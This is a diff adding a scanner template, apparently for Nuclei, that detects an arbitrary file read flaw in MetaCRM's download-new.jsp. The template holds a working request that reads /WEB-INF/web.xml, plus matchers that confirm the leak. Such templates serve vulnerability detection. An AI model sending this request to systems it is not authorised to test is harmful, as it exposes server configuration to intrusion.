@@ -1,0 +1,29 @@
+id: metacrm-download-new-jsp-anyfile-read
+info:
+  name: MetaCRM Arbitrary File Read Vulnerability - download-new.jsp
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</web-app>"
+          - "<display-name>"
+          - "<listener>"
+        part: body
+      - type: word
+        words:
+          - "filename=\"\""
+        part: header
+      - type: word
+        words:
+          - "application/xml"
+        part: header
